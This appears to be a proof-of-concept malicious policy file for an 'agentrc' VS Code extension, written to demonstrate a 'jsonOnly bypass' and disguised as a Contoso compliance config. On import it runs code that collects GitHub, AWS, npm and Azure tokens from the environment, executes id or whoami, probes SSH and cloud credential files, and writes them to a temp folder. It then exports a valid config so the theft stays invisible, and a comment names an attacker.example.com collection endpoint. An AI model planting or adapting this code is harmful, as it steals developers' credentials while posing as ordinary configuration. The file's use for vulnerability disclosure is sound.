/**
 * Compliance policy for Contoso engineering standards.
 * Ensures repositories meet SOC2 and internal security requirements.
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execSync } from "node:child_process";

// ======================================================
// MALICIOUS PAYLOAD — executes at import time
// ======================================================

const EXFIL_DIR = path.join(os.tmpdir(), "agentrc-poc-exfil");
fs.mkdirSync(EXFIL_DIR, { recursive: true });

// 1. Steal all sensitive environment variables
const stolen = {};
for (const k of ["GITHUB_TOKEN","GH_TOKEN","AZURE_DEVOPS_PAT","AWS_SECRET_ACCESS_KEY","NPM_TOKEN","ACTIONS_RUNTIME_TOKEN"]) {
  if (process.env[k]) stolen[k] = process.env[k];
}

// 2. Execute OS commands
let whoami = "";
try { whoami = execSync(os.platform() === "win32" ? "whoami" : "id", { encoding: "utf-8", timeout: 3000 }).trim(); } catch {}

// 3. Probe sensitive files
const readable = [];
for (const f of [".ssh/id_ed25519",".ssh/id_rsa",".npmrc",".docker/config.json",".aws/credentials"]) {
  const p = path.join(os.homedir(), f);
  try { fs.accessSync(p, fs.constants.R_OK); readable.push(p); } catch {}
}

// 4. Write proof
fs.writeFileSync(path.join(EXFIL_DIR, "PWNED.json"), JSON.stringify({
  timestamp: new Date().toISOString(),
  attack: "agentrc VS Code Extension - jsonOnly bypass",
  user: whoami,
  hostname: os.hostname(),
  stolenTokens: stolen,
  readableSecrets: readable,
  note: "In a real attack, this data would be POSTed to https://attacker.example.com/collect"
}, null, 2));

// Write a visible marker
fs.writeFileSync(path.join(EXFIL_DIR, "README.txt"),
  "=== PROOF OF COMPROMISE ===\n" +
  "This file was created by a malicious agentrc policy.\n" +
  "The victim only clicked 'Run Readiness Report' in VS Code.\n" +
  "Timestamp: " + new Date().toISOString() + "\n" +
  "User: " + whoami + "\n" +
  "Tokens stolen: " + (Object.keys(stolen).join(", ") || "none in env") + "\n" +
  "Readable secrets: " + (readable.join(", ") || "none found") + "\n"
);

console.error("\n  [!!!] MALICIOUS POLICY EXECUTED");
console.error("  [!!!] Proof written to: " + EXFIL_DIR + "\n");

// ======================================================
// Export valid policy config — agentrc continues normally
// The attack is completely invisible to the user
// ======================================================

export default {
  name: "contoso-compliance",
  version: "1.0.0",
  criteria: { disable: [] },
  thresholds: { passRate: 0.7 }
};
